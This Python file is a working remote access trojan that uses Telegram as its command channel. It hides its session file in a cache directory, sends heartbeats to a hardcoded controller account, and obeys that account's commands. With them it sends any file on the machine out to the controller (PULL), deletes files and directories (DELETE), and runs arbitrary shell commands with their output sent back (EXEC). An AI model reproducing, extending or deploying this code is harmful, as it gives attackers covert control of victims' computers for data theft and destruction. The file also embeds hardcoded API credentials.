import asyncio
import os
import subprocess
import sys
import traceback
from telethon import TelegramClient, events

API_ID = 3910389
API_HASH = '86f861352f0ab76a251866059a6adbd6'
SESSION_PATH = os.path.expanduser('~/.config/.cache/client.session')
CONTROLLER_ID = 8167615243
HEARTBEAT_INTERVAL = 60

client = TelegramClient(SESSION_PATH, API_ID, API_HASH)
CONTROLLER_ENTITY = None

async def resolve_controller():
    global CONTROLLER_ENTITY
    print("[*] Resolving controller entity...")
    try:
        CONTROLLER_ENTITY = await client.get_input_entity(CONTROLLER_ID)
        print("[+] Controller entity resolved via get_input_entity.")
    except Exception as e:
        print(f"[-] get_input_entity failed: {e}")
        try:
            CONTROLLER_ENTITY = await client.get_entity(CONTROLLER_ID)
            print("[+] Controller entity resolved via get_entity.")
        except Exception as e2:
            print(f"[-] get_entity failed: {e2}")
            CONTROLLER_ENTITY = None

async def heartbeat():
    while True:
        await asyncio.sleep(HEARTBEAT_INTERVAL)
        try:
            target = CONTROLLER_ENTITY if CONTROLLER_ENTITY else CONTROLLER_ID
            await client.send_message(target, 'HEARTBEAT')
            print("[+] Heartbeat sent.")
        except Exception as e:
            print(f"[-] Heartbeat failed: {e}")

@client.on(events.NewMessage(from_users=CONTROLLER_ID))
async def handler(event):
    print(f"[*] Received command: {event.raw_text}")
    text = event.raw_text
    target = CONTROLLER_ENTITY if CONTROLLER_ENTITY else CONTROLLER_ID

    if text.startswith('PULL '):
        path = text[5:].strip()
        if os.path.exists(path):
            print(f"[*] Sending file: {path}")
            await client.send_file(target, path)
        else:
            await client.send_message(target, f'ERROR: {path} not found')

    elif text.startswith('DELETE '):
        path = text[7:].strip()
        try:
            if os.path.isdir(path):
                import shutil
                shutil.rmtree(path)
            else:
                os.remove(path)
            await client.send_message(target, f'OK: deleted {path}')
            print(f"[+] Deleted: {path}")
        except Exception as e:
            await client.send_message(target, f'ERROR: {e}')

    elif text.startswith('EXEC '):
        cmd = text[5:].strip()
        try:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            out, _ = proc.communicate()
            await client.send_message(target, f'OUTPUT:\n{out.decode()}')
            print(f"[+] Executed: {cmd}")
        except Exception as e:
            await client.send_message(target, f'ERROR: {e}')

    elif text.startswith('SLEEP '):
        seconds = int(text[6:].strip())
        await client.send_message(target, f'Sleeping for {seconds} seconds')
        print(f"[*] Sleeping for {seconds} seconds...")
        await client.disconnect()
        await asyncio.sleep(seconds)
        await client.connect()
        await client.send_message(target, 'Awake')
        print("[+] Awake.")

async def main():
    print("[*] Starting client...")
    await client.start()
    print("[+] Client started.")
    
    me = await client.get_me()
    print(f"[+] Logged in as: {me.first_name} (ID: {me.id})")
    
    await resolve_controller()
    
    print("[*] Starting heartbeat loop...")
    asyncio.create_task(heartbeat())
    await client.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[-] Stopped by user.")
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        traceback.print_exc()
